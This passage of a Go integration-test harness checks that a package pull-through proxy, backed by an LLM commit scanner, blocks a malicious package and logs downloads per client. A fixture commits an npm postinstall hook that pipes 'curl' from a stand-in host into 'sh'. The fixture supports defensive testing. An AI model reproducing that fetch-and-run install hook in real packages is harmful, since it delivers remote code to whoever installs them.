				time.Sleep(300 * time.Millisecond)
			}
			all := r.policyBlocks()
			if len(all) < blocksBefore {
				continue
			}
			blocks = all[blocksBefore:]
			for i := range blocks {
				if strings.EqualFold(blocks[i].Package, bad.pinName()) && blocks[i].Code == "malicious" {
					hit = &blocks[i]
					break
				}
			}
		}
		if hit == nil {
			lastDetail = fmt.Sprintf("the client failed (exit %d) but the proxy recorded no 'malicious' block for coordinate %q; "+
				"blocks recorded: %+v; client output tail:\n%s", res.exitCode, bad.pinName(), blocks, tail(res.output, 25))
			r.t.Logf("[%s] bad attempt %d/%d not attributable to the policy: %s", r.e.ID, attempt, r.s.attempts, lastDetail)
			continue
		}
		if hit.Commit != r.malicious {
			r.fail(CheckBlock, "the block cites commit %s, want the malicious fixture commit %s", hit.Commit, r.malicious)
			return nil
		}
		r.pass(CheckBlock, "proxy refused %s (403 %s, source commit %s flagged by the LLM) and %s failed with exit %d",
			hit.Artifact, hit.Code, shortSHA(hit.Commit), r.e.Client, res.exitCode)
		return res
	}
	r.fail(CheckBlock, "%s", lastDetail)
	r.dumpProxyLog(40)
	return nil
}

// downloadEntry is one entry of the proxy's download log, as the admin API
// returns it.
type downloadEntry struct {
	ID        uint64 `json:"id"`
	ClientIP  string `json:"clientIp"`
	Ecosystem string `json:"ecosystem"`
	Upstream  string `json:"upstream"`
	Package   string `json:"package"`
	Version   string `json:"version"`
	Kind      string `json:"kind"`
	Outcome   string `json:"outcome"`
	Gate      string `json:"gate"`
	Code      string `json:"code"`
	Cache     string `json:"cache"`
	Status    int    `json:"status"`
	Bytes     int64  `json:"bytes"`
	UserAgent string `json:"userAgent"`
	Path      string `json:"path"`
}

// downloads queries the proxy's download log through the admin API — the
// endpoint the console's Downloads tab reads.
func (r *run) downloads(query url.Values) ([]downloadEntry, error) {
	query.Set("limit", "1000")
	var resp struct {
		Enabled bool            `json:"enabled"`
		Total   int             `json:"total"`
		Entries []downloadEntry `json:"entries"`
	}
	if err := r.getJSON("/admin/api/downloads?"+query.Encode(), &resp); err != nil {
		return nil, err
	}
	if !resp.Enabled {
		return nil, errors.New("the download log is not enabled in the proxy (it is on by default)")
	}
	return resp.Entries, nil
}

// assertDownloadLog checks what the proxy's download log says about the run
// (Task 176): which package went to which client address.
//
// first and second are the two successful installs of the good package, refused
// the client step whose pull of the bad package the policy refused. Each of
// them reached the proxy from its own address, so the assertion is exact:
//
//   - the good package is logged as served to the first machine's address and to
//     the second's — the second from the cache;
//   - the bad package is logged as blocked, by the admission policy, for the
//     third machine's address, and as served to nobody;
//   - filtering by one machine's address lists that machine's entries only.
//
// The entry is written when the proxy has finished answering, a moment after the
// client received the last byte; a short wait bridges that.
func (r *run) assertDownloadLog(first, second, refused *clientResult) error {
	e := r.e
	bad := *e.Bad
	if first == nil || second == nil || refused == nil {
		return errors.New("an earlier step did not produce the client runs the download log is checked against")
	}
	if !r.s.openNetwork && (first.addr == second.addr || first.addr == refused.addr || second.addr == refused.addr) {
		return fmt.Errorf("the client steps did not get distinct addresses: %s, %s, %s", first.addr, second.addr, refused.addr)
	}

	coordinate := func(p Package) url.Values {
		v := url.Values{"ecosystem": {e.Upstream.Type}, "package": {p.pinName()}}
		if p.CoordinateVersion != "" {
			v.Set("version", p.CoordinateVersion)
		}
		return v
	}
	// find returns the entry for p from addr, waiting briefly for it.
	find := func(p Package, addr, outcome string) (*downloadEntry, []downloadEntry, error) {
		var entries []downloadEntry
		for wait := 0; wait < 20; wait++ {
			if wait > 0 {
				time.Sleep(250 * time.Millisecond)
			}
			query := coordinate(p)
			query.Set("outcome", outcome)
			var err error
			if entries, err = r.downloads(query); err != nil {
				return nil, nil, err
			}
			for i := range entries {
				if entries[i].ClientIP == addr {
					return &entries[i], entries, nil
				}
			}
		}
		return nil, entries, nil
	}
	summarize := func(entries []downloadEntry) string {
		if len(entries) == 0 {
			return "(none)"
		}
		parts := make([]string, 0, len(entries))
		for _, d := range entries {
			parts = append(parts, fmt.Sprintf("%s %s@%s %s", d.ClientIP, d.Package, d.Version, d.Outcome))
		}
		return strings.Join(parts, "; ")
	}

	// The good package, served to both machines.
	one, all, err := find(e.Good, first.addr, "served")
	if err != nil {
		return fmt.Errorf("reading the download log: %w", err)
	}
	if one == nil {
		return fmt.Errorf("the log has no served entry for %s from the first client's address %s; served entries for it: %s",
			packageLabel(e.Good), first.addr, summarize(all))
	}
	two, all, err := find(e.Good, second.addr, "served")
	if err != nil {
		return fmt.Errorf("reading the download log: %w", err)
	}
	if two == nil {
		return fmt.Errorf("the log has no served entry for %s from the second client's address %s; served entries for it: %s",
			packageLabel(e.Good), second.addr, summarize(all))
	}
	for _, d := range []*downloadEntry{one, two} {
		if d.Ecosystem != e.Upstream.Type || d.Upstream != e.Upstream.Name || d.Bytes <= 0 || d.Status != http.StatusOK || d.Kind != "package" {
			return fmt.Errorf("the entry for %s from %s is %+v; want a served package of ecosystem %s with a size", packageLabel(e.Good), d.ClientIP, *d, e.Upstream.Type)
		}
	}
	if e.applies(CheckCacheHit) && two.Cache != "HIT" {
		return fmt.Errorf("the second client's entry for %s reports cache %q, want HIT", packageLabel(e.Good), two.Cache)
	}

	// The bad package: refused for the third machine, served to nobody.
	block, all, err := find(bad, refused.addr, "blocked")
	if err != nil {
		return fmt.Errorf("reading the download log: %w", err)
	}
	if block == nil {
		return fmt.Errorf("the log has no blocked entry for %s from %s; blocked entries for it: %s", packageLabel(bad), refused.addr, summarize(all))
	}
	if block.Gate != "policy" || block.Code != "malicious" || block.Bytes != 0 {
		return fmt.Errorf("the refused pull of %s is logged as %+v; want it blocked by the policy gate with code malicious and no bytes sent", packageLabel(bad), *block)
	}
	servedBad := coordinate(bad)
	servedBad.Set("outcome", "served")
	leaked, err := r.downloads(servedBad)
	if err != nil {
		return fmt.Errorf("reading the download log: %w", err)
	}
	if len(leaked) > 0 {
		return fmt.Errorf("the log shows the refused %s as served: %s", packageLabel(bad), summarize(leaked))
	}

	// Filtering by an address lists that machine's entries and nobody else's.
	if !r.s.openNetwork {
		for _, tc := range []struct {
			who  string
			step *clientResult
			pkg  Package
		}{{"first", first, e.Good}, {"second", second, e.Good}, {"refused", refused, bad}} {
			entries, err := r.downloads(url.Values{"ip": {tc.step.addr}})
			if err != nil {
				return fmt.Errorf("reading the download log: %w", err)
			}
			found := false
			for _, d := range entries {
				if d.ClientIP != tc.step.addr {
					return fmt.Errorf("filtering by %s returned an entry of %s", tc.step.addr, d.ClientIP)
				}
				if strings.EqualFold(d.Package, tc.pkg.pinName()) {
					found = true
				}
			}
			if !found {
				return fmt.Errorf("filtering by the %s client's address %s does not list %s: %s", tc.who, tc.step.addr, packageLabel(tc.pkg), summarize(entries))
			}
		}
		// And the machine that was refused got nothing of the bad package.
		got, err := r.downloads(url.Values{"ip": {refused.addr}, "outcome": {"served"}, "package": {bad.pinName()}})
		if err != nil {
			return fmt.Errorf("reading the download log: %w", err)
		}
		if len(got) > 0 {
			return fmt.Errorf("the refused client %s has served entries for %s: %s", refused.addr, packageLabel(bad), summarize(got))
		}
	}

	r.pass(CheckDownloadLog, "%s served to %s (%s) and %s (%s); %s blocked by %s (%s) for %s",
		packageLabel(e.Good), one.ClientIP, one.Cache, two.ClientIP, two.Cache,
		packageLabel(bad), block.Gate, block.Code, block.ClientIP)
	return nil
}

// clientStep runs the client for a package that must install, retrying on
// failure. It returns the successful run.
func (r *run) clientStep(step string, pkg Package, mustSucceed bool) (*clientResult, error) {
	var last error
	for attempt := 1; attempt <= r.s.attempts; attempt++ {
		name := step
		if attempt > 1 {
			name = fmt.Sprintf("%s-retry%d", step, attempt-1)
		}
		res, err := r.runClient(name, pkg)
		switch {
		case err != nil:
			last = err
		case res.exitCode == 0 || !mustSucceed:
			return res, nil
		default:
			last = fmt.Errorf("%s exited %d installing %s (log: %s); output tail:\n%s",
				r.e.Client, res.exitCode, packageLabel(pkg), res.logPath, tail(res.output, 30))
		}
		r.t.Logf("[%s] step %s attempt %d/%d failed: %v", r.e.ID, step, attempt, r.s.attempts, last)
		time.Sleep(time.Duration(attempt) * 3 * time.Second)
	}
	return nil, last
}

// ---------------------------------------------------------------------------
// Running the real client
// ---------------------------------------------------------------------------

type clientResult struct {
	exitCode int
	output   string
	logPath  string
	version  string
	// addr is the source address the proxy saw this client step come from.
	addr string
}

var clientVersionRE = regexp.MustCompile(`(?m)^ECOTEST_CLIENT_VERSION=(.*)$`)

// clientEnv is the environment contract handed to a client script.
func (r *run) clientEnv(pkg Package) []string {
	env := []string{
		"PROXY_URL=" + r.publicURL,
		"PROXY_HOST=" + r.proxyHost,
		"MOUNT=" + r.publicURL + "/v1/" + r.e.Upstream.Name,
		"PKG_NAME=" + pkg.Name,
		"PKG_VERSION=" + pkg.Version,
	}
	if r.caCert != "" {
		env = append(env, "PT_CA_CERT=/work/ca.crt")
	}
	keys := make([]string, 0, len(pkg.Env))
	for k := range pkg.Env {
		keys = append(keys, k)
	}
	sort.Strings(keys)
	for _, k := range keys {
		env = append(env, k+"="+pkg.Env[k])
	}
	return env
}

// runClient executes the ecosystem's client script once, in a pristine
// environment, to install pkg. It returns the exit status and output; a
// non-zero exit is not an error here.
func (r *run) runClient(step string, pkg Package) (*clientResult, error) {
	scratch := filepath.Join(r.root, "client", step)
	if err := os.MkdirAll(scratch, 0o777); err != nil {
		return nil, err
	}
	// The container user differs per image (root, ubuntu, linuxbrew): make the
	// scratch directory usable by any of them.
	if err := os.Chmod(scratch, 0o777); err != nil {
		return nil, err
	}
	script, err := r.e.Script()
	if err != nil {
		return nil, err
	}
	if err := os.WriteFile(filepath.Join(scratch, "client.sh"), script, 0o755); err != nil {
		return nil, err
	}
	if r.caCert != "" {
		pemBytes, err := os.ReadFile(r.caCert)
		if err != nil {
			return nil, err
		}
		if err := os.WriteFile(filepath.Join(scratch, "ca.crt"), pemBytes, 0o644); err != nil {
			return nil, err
		}
	}

	ctx, cancel := context.WithTimeout(context.Background(), r.e.timeout())
	defer cancel()

	name := fmt.Sprintf("ecotest-%s-%s-%d", r.e.ID, step, os.Getpid())
	logPath := filepath.Join(r.root, "logs", "client-"+step+".log")
	env := r.clientEnv(pkg)

	// This step is a client machine of its own: its traffic reaches the proxy
	// from an address no other step uses.
	bridge, err := r.openBridge()
	if err != nil {
		return nil, fmt.Errorf("client step %s: opening the bridge to the proxy: %w", step, err)
	}

	var out []byte
	var runErr error
	started := time.Now()
	switch r.e.runner() {
	case RunnerDind:
		out, runErr = r.runInDind(ctx, name, scratch, env, bridge)
	default:
		out, runErr = r.runInContainer(ctx, name, scratch, env, bridge)
	}
	_ = os.WriteFile(logPath, out, 0o644)

	res := &clientResult{output: string(out), logPath: logPath, addr: bridge.addr}
	if r.s.openNetwork && r.e.runner() != RunnerDind {
		// On the host network the client talks to the proxy directly.
		res.addr = "127.0.0.1"
	}
	if m := clientVersionRE.FindStringSubmatch(res.output); m != nil {
		res.version = strings.TrimSpace(m[1])
	}
	if runErr != nil {
		var exitErr *exec.ExitError
		if ctx.Err() != nil {
			return nil, fmt.Errorf("client step %s timed out after %s (log: %s)", step, r.e.timeout(), logPath)
		}
		if !errors.As(runErr, &exitErr) {
			return nil, fmt.Errorf("client step %s: %w (log: %s)", step, runErr, logPath)
		}
		res.exitCode = exitErr.ExitCode()
		// 125-127 are Docker's own failures (daemon error, command not found),
		// not the client's verdict on the package.
		if res.exitCode >= 125 && res.exitCode <= 127 {
			return nil, fmt.Errorf("client step %s could not be run (docker exit %d, log: %s): %s",
				step, res.exitCode, logPath, tail(res.output, 15))
		}
	}
	r.t.Logf("[%s] client step %s (from %s): exit %d in %s (log: %s)", r.e.ID, step, res.addr, res.exitCode,
		time.Since(started).Round(time.Millisecond), logPath)
	return res, nil
}

// runInContainer runs the client script in a throwaway container of the
// ecosystem's image. The container has no network; the wrapper starts the
// forwarder that makes the proxy — and only the proxy — reachable.
func (r *run) runInContainer(ctx context.Context, name, scratch string, env []string, bridge *stepBridge) ([]byte, error) {
	args := []string{"run", "--rm", "--name", name, "-v", scratch + ":/work", "-w", "/work"}
	script := "/work/client.sh"
	if r.s.openNetwork {
		args = append(args, "--network", "host")
	} else {
		args = append(args, "--network", "none", "-v", r.toolDir+":"+containerToolDir+":ro")
		env = append(env, r.forwarderEnv(bridge)...)
		script = containerToolDir + "/run.sh"
	}
	if r.e.User != "" {
		args = append(args, "--user", r.e.User)
	}
	for _, kv := range env {
		args = append(args, "-e", kv)
	}
	if r.e.Entrypoint != "" {
		args = append(args, "--entrypoint", r.e.Entrypoint, r.e.Image, script)
	} else {
		args = append(args, r.e.Image, "sh", script)
	}
	r.containers = append(r.containers, name)
	cmd := exec.CommandContext(ctx, "docker", args...)
	out, err := cmd.CombinedOutput()
	if ctx.Err() != nil {
		_ = exec.Command("docker", "rm", "-f", name).Run()
	}
	return out, err
}

// runInDind starts a private Docker daemon whose registry mirror is the proxy,
// runs the client script inside it, and removes it again. A fresh daemon per
// step is what makes each step start from an empty image store. Like every other
// client it has no network: the daemon reaches the proxy through the forwarder,
// and — as in a deployment without direct egress — cannot fall back to Docker
// Hub when the proxy refuses an image.
func (r *run) runInDind(ctx context.Context, name, scratch string, env []string, bridge *stepBridge) ([]byte, error) {
	r.containers = append(r.containers, name)
	args := []string{"run", "-d", "--privileged", "--name", name, "--network", "none",
		"-v", scratch + ":/work", "-v", r.toolDir + ":" + containerToolDir + ":ro",
		"-e", "DOCKER_TLS_CERTDIR=",
		// The mirror is the proxy's host root. It is a loopback address, which the
		// Docker Engine accepts over plain HTTP without an insecure-registries entry.
		r.e.Image, "--registry-mirror=" + r.publicURL}
	if out, err := exec.CommandContext(ctx, "docker", args...).CombinedOutput(); err != nil {
		return out, fmt.Errorf("starting the docker-in-docker daemon: %w", err)
	}
	defer func() { _ = exec.Command("docker", "rm", "-f", "-v", name).Run() }()

	fwd := []string{"exec", "-d"}
	for _, kv := range r.forwarderEnv(bridge) {
		fwd = append(fwd, "-e", kv)
	}
	fwd = append(fwd, name, containerToolDir+"/helper")
	if out, err := exec.CommandContext(ctx, "docker", fwd...).CombinedOutput(); err != nil {
		return out, fmt.Errorf("starting the forwarder in the docker-in-docker container: %w", err)
	}

	ready := false
	for i := 0; i < 120 && ctx.Err() == nil; i++ {
		daemonUp := exec.CommandContext(ctx, "docker", "exec", name, "docker", "info").Run() == nil
		forwarderUp := exec.CommandContext(ctx, "docker", "exec", name, "test", "-e", containerReadyFile).Run() == nil
		if daemonUp && forwarderUp {
			ready = true
			break
		}
		time.Sleep(500 * time.Millisecond)
	}
	if !ready {
		logs, _ := exec.Command("docker", "logs", "--tail", "40", name).CombinedOutput()
		return logs, errors.New("the docker-in-docker daemon (or its forwarder) did not become ready")
	}

	run := []string{"exec", "-w", "/work"}
	for _, kv := range env {
		run = append(run, "-e", kv)
	}
	run = append(run, name, "sh", "/work/client.sh")
	return exec.CommandContext(ctx, "docker", run...).CombinedOutput()
}

// ---------------------------------------------------------------------------
// Observing the proxy
// ---------------------------------------------------------------------------

// getJSON fetches an admin API document.
func (r *run) getJSON(path string, v any) error {
	resp, err := r.client.Get(r.adminBase() + path)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(io.LimitReader(resp.Body, 64<<20))
	if err != nil {
		return err
	}
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("GET %s: status %d: %s", path, resp.StatusCode, tail(string(body), 5))
	}
	return json.Unmarshal(body, v)
}

type scanVerdict struct {
	SHA       string `json:"sha"`
	RiskScore int    `json:"riskScore"`
	Malicious bool   `json:"malicious"`
}

// scanVerdicts returns the commit scanner's verdicts keyed by commit hash.
func (r *run) scanVerdicts() (map[string]scanVerdict, error) {
	var resp struct {
		Enabled bool          `json:"enabled"`
		Items   []scanVerdict `json:"items"`
	}
	if err := r.getJSON("/admin/api/scans?limit=1000", &resp); err != nil {
		return nil, err
	}
	if !resp.Enabled {
		return nil, errors.New("commit scanning is not enabled in the proxy")
	}
	out := make(map[string]scanVerdict, len(resp.Items))
	for _, v := range resp.Items {
		out[v.SHA] = v
	}
	return out, nil
}

type cacheEntry struct {
	Key     string    `json:"key"`
	Size    int64     `json:"size"`
	ModTime time.Time `json:"modTime"`
}

// findArtifact returns the cache entry of the good package's artifact.
func (r *run) findArtifact() (*cacheEntry, error) {
	var resp struct {
		Total int          `json:"total"`
		Items []cacheEntry `json:"items"`
	}
	if err := r.getJSON("/admin/api/cache?limit=100000", &resp); err != nil {
		return nil, fmt.Errorf("listing the cache: %w", err)
	}
	re := regexp.MustCompile(r.e.Artifact)
	var match *cacheEntry
	for i := range resp.Items {
		if re.MatchString(resp.Items[i].Key) {
			// Prefer the largest match: where a pattern covers several entries
			// (image layers, NAR files) the payload is the meaningful one.
			if match == nil || resp.Items[i].Size > match.Size {
				match = &resp.Items[i]
			}
		}
	}
	if match == nil {
		keys := make([]string, 0, len(resp.Items))
		for _, it := range resp.Items {
			if strings.HasPrefix(it.Key, r.e.Upstream.Name+":") {
				keys = append(keys, it.Key)
			}
		}
		if len(keys) > 12 {
			keys = append(keys[:12], fmt.Sprintf("... (%d more)", len(keys)-12))
		}
		return nil, fmt.Errorf("no cache entry matches %q: the artifact did not flow through the proxy's cache "+
			"(%d entries; this upstream's keys: %v)", r.e.Artifact, resp.Total, keys)
	}
	if match.Size <= 0 {
		return nil, fmt.Errorf("cache entry %s is empty", match.Key)
	}
	return match, nil
}

type provenanceLink struct {
	Name      string `json:"name"`
	Version   string `json:"version"`
	Ecosystem string `json:"ecosystem"`
	CommitSHA string `json:"commitSha"`
	Resolver  string `json:"resolver"`
	Verdict   *struct {
		RiskScore int  `json:"riskScore"`
		Malicious bool `json:"malicious"`
	} `json:"verdict"`
}

// provenanceLinks returns the package -> commit links the proxy has recorded.
func (r *run) provenanceLinks() ([]provenanceLink, error) {
	var resp struct {
		Enabled bool             `json:"enabled"`
		Items   []provenanceLink `json:"items"`
	}
	if err := r.getJSON("/admin/api/provenance/links?limit=100000", &resp); err != nil {
		return nil, err
	}
	if !resp.Enabled {
		return nil, errors.New("provenance is not enabled in the proxy")
	}
	return resp.Items, nil
}

// metricSet is a parsed Prometheus exposition.
type metricSet []metricSample

type metricSample struct {
	name   string
	labels map[string]string
	value  float64
}

var metricLineRE = regexp.MustCompile(`^([a-zA-Z_:][a-zA-Z0-9_:]*)(\{[^}]*\})?\s+(\S+)`)
var metricLabelRE = regexp.MustCompile(`([a-zA-Z_][a-zA-Z0-9_]*)="((?:[^"\\]|\\.)*)"`)

// metrics scrapes and parses the proxy's Prometheus endpoint.
func (r *run) metrics() (metricSet, error) {
	resp, err := r.client.Get(r.adminBase() + "/metrics")
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("GET /metrics: status %d", resp.StatusCode)
	}
	var set metricSet
	sc := bufio.NewScanner(resp.Body)
	sc.Buffer(make([]byte, 0, 64<<10), 4<<20)
	for sc.Scan() {
		line := sc.Text()
		if line == "" || line[0] == '#' {
			continue
		}
		m := metricLineRE.FindStringSubmatch(line)
		if m == nil {
			continue
		}
		v, err := strconv.ParseFloat(m[3], 64)
		if err != nil {
			continue
		}
		labels := map[string]string{}
		for _, lm := range metricLabelRE.FindAllStringSubmatch(m[2], -1) {
			labels[lm[1]] = lm[2]
		}
		set = append(set, metricSample{name: m[1], labels: labels, value: v})
	}
	return set, sc.Err()
}

// sum adds up every sample of a metric whose labels include all of want.
func (s metricSet) sum(name string, want map[string]string) float64 {
	var total float64
sample:
	for _, m := range s {
		if m.name != name {
			continue
		}
		for k, v := range want {
			if m.labels[k] != v {
				continue sample
			}
		}
		total += m.value
	}
	return total
}

// logRecords returns the proxy's structured log records.
func (r *run) logRecords() []map[string]any {
	f, err := os.Open(r.logPath)
	if err != nil {
		return nil
	}
	defer f.Close()
	var out []map[string]any
	sc := bufio.NewScanner(f)
	sc.Buffer(make([]byte, 0, 64<<10), 8<<20)
	for sc.Scan() {
		var rec map[string]any
		if json.Unmarshal(sc.Bytes(), &rec) == nil {
			out = append(out, rec)
		}
	}
	return out
}

// sawRequest reports whether the proxy answered a request whose path matches re
// with a 2xx status.
func (r *run) sawRequest(re *regexp.Regexp) bool {
	for _, rec := range r.logRecords() {
		if rec["msg"] != "request" {
			continue
		}
		path, _ := rec["path"].(string)
		status, _ := rec["status"].(float64)
		if status >= 200 && status < 300 && re.MatchString(path) {
			return true
		}
	}
	return false
}

// policyBlock is one admission-policy block from the proxy's audit log.
type policyBlock struct {
	// Artifact is the request path the block was issued for.
	Artifact string
	// Package and Version are the coordinate the policy evaluated.
	Package string
	Version string
	// Code is the machine reason ("malicious", "denylisted", ...).
	Code string
	// Commit is the source commit the decision was based on.
	Commit string
}

// policyBlocks returns every admission-policy block recorded in the proxy's
// tamper-evident audit log, in order. The audit record is the authoritative
// account of a decision: it names the coordinate, the machine reason code and
// the source commit the decision was based on.
func (r *run) policyBlocks() []policyBlock {
	f, err := os.Open(AuditLogPath(r.stateDir))
	if err != nil {
		return nil
	}
	defer f.Close()

	var out []policyBlock
	sc := bufio.NewScanner(f)
	sc.Buffer(make([]byte, 0, 64<<10), 8<<20)
	for sc.Scan() {
		var rec struct {
			Event struct {
				Type     string         `json:"type"`
				Resource string         `json:"resource"`
				Decision string         `json:"decision"`
				Detail   map[string]any `json:"detail"`
			} `json:"event"`
		}
		if json.Unmarshal(sc.Bytes(), &rec) != nil {
			continue
		}
		ev := rec.Event
		if ev.Type != "policy_decision" || ev.Detail["action"] != "block" {
			continue
		}
		b := policyBlock{Artifact: ev.Resource}
		b.Package, _ = ev.Detail["package"].(string)
		b.Version, _ = ev.Detail["version"].(string)
		b.Code, _ = ev.Detail["code"].(string)
		b.Commit, _ = ev.Detail["commitSha"].(string)
		out = append(out, b)
	}
	return out
}

// dumpProxyLog logs the tail of the proxy log, for diagnosing a failure from the
// CI job output alone.
func (r *run) dumpProxyLog(lines int) {
	data, err := os.ReadFile(r.logPath)
	if err != nil {
		return
	}
	r.t.Logf("[%s] proxy log tail (%s):\n%s", r.e.ID, r.logPath, tail(string(data), lines))
}

// ---------------------------------------------------------------------------
// Teardown
// ---------------------------------------------------------------------------

func (r *run) teardown() {
	for _, name := range r.containers {
		_ = exec.Command("docker", "rm", "-f", "-v", name).Run()
	}
	if r.proxy != nil && r.proxy.Process != nil {
		// Graceful first (the proxy seals its audit log on shutdown), then firm.
		// Wait for the exit either way so the workspace is not removed underneath
		// a process that is still writing to it.
		_ = r.proxy.Process.Signal(syscall.SIGTERM)
		select {
		case <-r.proxyExited:
		case <-time.After(20 * time.Second):
			_ = r.proxy.Process.Kill()
			<-r.proxyExited
		}
	}
	if r.llm != nil {
		_ = r.llm.Close()
	}
	for _, ln := range r.bridges {
		_ = ln.Close()
	}
	if r.toolDir != "" {
		_ = os.RemoveAll(r.toolDir)
	}
}

// removeWorkspace deletes the ecosystem's workspace. The client scratch
// directories hold files created by the container's user (usually root), which
// the test process may not be allowed to delete; those are removed from inside a
// container of the same image instead.
func (r *run) removeWorkspace() {
	if os.RemoveAll(r.root) == nil {
		return
	}
	clientDir := filepath.Join(r.root, "client")
	if _, err := os.Stat(clientDir); err == nil {
		args := []string{"run", "--rm", "--network", "none", "--user", "0",
			"-v", clientDir + ":/cleanup", "--entrypoint", "sh", r.e.Image, "-c", "rm -rf /cleanup/* /cleanup/.[!.]* 2>/dev/null; true"}
		_ = exec.Command("docker", args...).Run()
	}
	if err := os.RemoveAll(r.root); err != nil {
		r.t.Logf("[%s] could not remove the workspace %s: %v", r.e.ID, r.root, err)
	}
}

// ---------------------------------------------------------------------------
// Fixtures and helpers
// ---------------------------------------------------------------------------

// createSourceRepo builds the fixture source repository: a bare Git repository
// whose "main" branch holds a benign commit followed by a malicious one (its
// diff carries MaliciousMarker inside an install hook that pipes a remote script
// into a shell). It returns the repository path and both commit hashes.
//
// Author, committer and dates are fixed, so the hashes are the same on every
// run — convenient when comparing logs across CI runs.
func createSourceRepo(dir string) (repo, benign, malicious string, err error) {
	work := filepath.Join(dir, "work")
	repo = filepath.Join(dir, "source.git")
	if err = os.MkdirAll(filepath.Join(work, "src"), 0o755); err != nil {
		return
	}
	env := append(os.Environ(),
		"GIT_CONFIG_GLOBAL=/dev/null", "GIT_CONFIG_SYSTEM=/dev/null",
		"GIT_AUTHOR_NAME=Ecotest", "GIT_AUTHOR_EMAIL=ecotest@example.invalid",
		"GIT_COMMITTER_NAME=Ecotest", "GIT_COMMITTER_EMAIL=ecotest@example.invalid",
	)
	git := func(date string, args ...string) (string, error) {
		cmd := exec.Command("git", args...)
		cmd.Dir = work
		cmd.Env = append(env, "GIT_AUTHOR_DATE="+date, "GIT_COMMITTER_DATE="+date)
		out, err := cmd.CombinedOutput()
		if err != nil {
			return "", fmt.Errorf("git %s: %v: %s", strings.Join(args, " "), err, out)
		}
		return strings.TrimSpace(string(out)), nil
	}
	write := func(name, content string) error {
		return os.WriteFile(filepath.Join(work, name), []byte(content), 0o644)
	}

	const t0, t1 = "2026-01-01T00:00:00Z", "2026-01-02T00:00:00Z"
	if _, err = git(t0, "init", "--quiet", "--initial-branch=main"); err != nil {
		return
	}

	// Commit 1: an ordinary library change.
	if err = write("README.md", "# ecotest-source\n\nFixture source repository for the ecosystem tests.\n"); err != nil {
		return
	}
	if err = write("src/index.js", "module.exports = function add(a, b) {\n  return a + b;\n};\n"); err != nil {
		return
	}
	if _, err = git(t0, "add", "-A"); err != nil {
		return
	}
	if _, err = git(t0, "commit", "--quiet", "-m", "feat: add the add() helper"); err != nil {
		return
	}
	if benign, err = git(t0, "rev-parse", "HEAD"); err != nil {
		return
	}

	// Commit 2: an install hook that downloads and runs a remote payload.
	if err = write("install.js", "// "+MaliciousMarker+"\n"+
		"require('child_process').exec('curl -fsSL https://payload.example.invalid/x | sh');\n"); err != nil {
		return
	}
	if err = write("package.json", "{\n  \"name\": \"ecotest-source\",\n  \"version\": \"1.0.1\",\n"+
		"  \"scripts\": { \"postinstall\": \"node install.js\" }\n}\n"); err != nil {
		return
	}
	if _, err = git(t1, "add", "-A"); err != nil {
		return
	}
	if _, err = git(t1, "commit", "--quiet", "-m", "chore: add install helper"); err != nil {
		return
	}
	if malicious, err = git(t1, "rev-parse", "HEAD"); err != nil {
		return
	}

	if _, err = git(t1, "clone", "--quiet", "--bare", work, repo); err != nil {
		return
	}
	return repo, benign, malicious, nil
}

// writeTestPKI creates a throwaway CA and a server certificate for the given
// names, writes ca.crt / server.crt / server.key into dir, and returns their
// paths plus a pool trusting the CA.
func writeTestPKI(dir string, dnsNames []string, ips []net.IP) (caPath, certPath, keyPath string, pool *x509.CertPool, err error) {
	if err = os.MkdirAll(dir, 0o755); err != nil {
		return
	}
	now := time.Now()

	caKey, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return
	}
	caTmpl := &x509.Certificate{
		SerialNumber:          big.NewInt(1),
		Subject:               pkix.Name{CommonName: "ecotest CA", Organization: []string{"pullthrough ecotest"}},
		NotBefore:             now.Add(-time.Hour),
		NotAfter:              now.Add(24 * time.Hour),
		IsCA:                  true,
		BasicConstraintsValid: true,
		KeyUsage:              x509.KeyUsageCertSign | x509.KeyUsageCRLSign,
	}
	caDER, err := x509.CreateCertificate(rand.Reader, caTmpl, caTmpl, &caKey.PublicKey, caKey)
	if err != nil {
		return
	}
	caCert, err := x509.ParseCertificate(caDER)
	if err != nil {
		return
	}

	leafKey, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return
	}
	leafTmpl := &x509.Certificate{
		SerialNumber: big.NewInt(2),
		Subject:      pkix.Name{CommonName: dnsNames[0]},
		NotBefore:    now.Add(-time.Hour),
		NotAfter:     now.Add(24 * time.Hour),
		KeyUsage:     x509.KeyUsageDigitalSignature,
		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		DNSNames:     dnsNames,
		IPAddresses:  ips,
	}
	leafDER, err := x509.CreateCertificate(rand.Reader, leafTmpl, caCert, &leafKey.PublicKey, caKey)
	if err != nil {
		return
	}
	leafKeyDER, err := x509.MarshalECPrivateKey(leafKey)
	if err != nil {
		return
	}

	caPath = filepath.Join(dir, "ca.crt")
	certPath = filepath.Join(dir, "server.crt")
	keyPath = filepath.Join(dir, "server.key")
	if err = os.WriteFile(caPath, pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: caDER}), 0o644); err != nil {
		return
	}
	if err = os.WriteFile(certPath, pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: leafDER}), 0o644); err != nil {
		return
	}
	if err = os.WriteFile(keyPath, pem.EncodeToMemory(&pem.Block{Type: "EC PRIVATE KEY", Bytes: leafKeyDER}), 0o600); err != nil {
		return
	}
	pool = x509.NewCertPool()
	pool.AddCert(caCert)
	return caPath, certPath, keyPath, pool, nil
}

// copyFile copies src to dst with the given mode.
func copyFile(src, dst string, mode os.FileMode) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()
	out, err := os.OpenFile(dst, os.O_CREATE|os.O_TRUNC|os.O_WRONLY, mode)
	if err != nil {
		return err
	}
	if _, err := io.Copy(out, in); err != nil {
		_ = out.Close()
		return err
	}
	return out.Close()
}

// freePort returns a currently free TCP port on host.
func freePort(host string) (int, error) {
	ln, err := net.Listen("tcp", net.JoinHostPort(host, "0"))
	if err != nil {
		return 0, fmt.Errorf("finding a free port on %s: %w", host, err)
	}
	defer ln.Close()
	return ln.Addr().(*net.TCPAddr).Port, nil
}

// tail returns the last n lines of s.
func tail(s string, n int) string {
	lines := strings.Split(strings.TrimRight(s, "\n"), "\n")
	if len(lines) > n {
		lines = lines[len(lines)-n:]
	}
